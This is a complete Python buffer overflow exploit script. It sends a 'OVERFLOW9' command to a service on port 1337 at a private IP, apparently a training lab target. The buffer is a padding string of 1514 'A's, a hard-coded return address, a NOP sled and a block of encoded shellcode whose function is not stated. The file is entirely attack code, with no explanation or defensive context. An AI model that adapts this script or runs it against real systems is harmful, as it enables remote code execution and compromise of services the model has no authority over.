#!/usr/bin/python3

import socket

ip = "10.10.240.201"
port = 1337

prefix = "OVERFLOW9 "
offset = 1514
overflow = "A" * offset
retn = "\xc7\x11\x50\x62"
padding = "\x90" * 16
payload = ("\xfc\xbb\x94\x9a\x33\xdf\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3"
"\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x68\x72\xb1\xdf\x90"
"\x83\xd6\x56\x75\xb2\xd6\x0d\xfe\xe5\xe6\x46\x52\x0a\x8c\x0b"
"\x46\x99\xe0\x83\x69\x2a\x4e\xf2\x44\xab\xe3\xc6\xc7\x2f\xfe"
"\x1a\x27\x11\x31\x6f\x26\x56\x2c\x82\x7a\x0f\x3a\x31\x6a\x24"
"\x76\x8a\x01\x76\x96\x8a\xf6\xcf\x99\xbb\xa9\x44\xc0\x1b\x48"
"\x88\x78\x12\x52\xcd\x45\xec\xe9\x25\x31\xef\x3b\x74\xba\x5c"
"\x02\xb8\x49\x9c\x43\x7f\xb2\xeb\xbd\x83\x4f\xec\x7a\xf9\x8b"
"\x79\x98\x59\x5f\xd9\x44\x5b\x8c\xbc\x0f\x57\x79\xca\x57\x74"
"\x7c\x1f\xec\x80\xf5\x9e\x22\x01\x4d\x85\xe6\x49\x15\xa4\xbf"
"\x37\xf8\xd9\xdf\x97\xa5\x7f\x94\x3a\xb1\x0d\xf7\x52\x76\x3c"
"\x07\xa3\x10\x37\x74\x91\xbf\xe3\x12\x99\x48\x2a\xe5\xde\x62"
"\x8a\x79\x21\x8d\xeb\x50\xe6\xd9\xbb\xca\xcf\x61\x50\x0a\xef"
"\xb7\xf7\x5a\x5f\x68\xb8\x0a\x1f\xd8\x50\x40\x90\x07\x40\x6b"
"\x7a\x20\xeb\x96\xed\x45\xea\x85\x78\x31\xf0\xb5\x93\x9e\x7d"
"\x53\xf9\x0e\x28\xcc\x96\xb7\x71\x86\x07\x37\xac\xe3\x08\xb3"
"\x43\x14\xc6\x34\x29\x06\xbf\xb4\x64\x74\x16\xca\x52\x10\xf4"
"\x59\x39\xe0\x73\x42\x96\xb7\xd4\xb4\xef\x5d\xc9\xef\x59\x43"
"\x10\x69\xa1\xc7\xcf\x4a\x2c\xc6\x82\xf7\x0a\xd8\x5a\xf7\x16"
"\x8c\x32\xae\xc0\x7a\xf5\x18\xa3\xd4\xaf\xf7\x6d\xb0\x36\x34"
"\xae\xc6\x36\x11\x58\x26\x86\xcc\x1d\x59\x27\x99\xa9\x22\x55"
"\x39\x55\xf9\xdd\x59\xb4\x2b\x28\xf2\x61\xbe\x91\x9f\x91\x15"
"\xd5\x99\x11\x9f\xa6\x5d\x09\xea\xa3\x1a\x8d\x07\xde\x33\x78"
"\x27\x4d\x33\xa9\x27\x71\xcb\x52")
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
